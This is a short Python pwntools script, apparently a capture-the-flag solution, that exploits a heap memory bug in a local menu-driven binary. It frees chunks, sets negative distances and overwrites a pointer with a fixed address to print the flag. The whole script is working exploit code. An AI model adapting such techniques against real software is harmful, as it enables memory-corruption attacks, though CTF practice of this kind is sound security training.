from pwn import*
#context.log_level ='debug'
def add(idx,length,name,sign):
	p.sendlineafter('---> ','1')
	p.sendlineafter('ID: ',str(idx))
	p.sendlineafter('Price: ','256')
	p.sendlineafter('Length: ',str(length))
	p.sendlineafter(' Name: ',name)
	if sign !=0:
		p.sendlineafter('station: ','20')
		for n in range(21):
			if n +1!= idx:
				p.sendlineafter('station ID: ',str(n+1))
				p.sendlineafter('distance: ','-1')
	else:
		p.sendlineafter('station: ','0')
def free(index):
	p.sendlineafter('---> ','2')
	p.sendlineafter('ID: ',str(index))
def show(index):
	p.sendlineafter('---> ','3')
	p.sendlineafter('ID: ',str(index))
def list(start,end):
	p.sendlineafter('---> ','4')
	p.sendlineafter('Station ID: ',str(start))
	p.sendlineafter('Station ID: ',str(end))

p = process('./main')
add(0,0x20,'FMYY',0)
add(30,0x20,'FMYY',0)
for i in range(21):
    add(i+1,0x10,'FMYY',1)
free(0)
list(1,2)
free(30)
add(29,0x10,p64(0)+p64(0x6068E0),0)
show(0)
p.recvuntil('name: ')
log.info('FLAG:\t'+p.recvuntil('}'))
p.close()
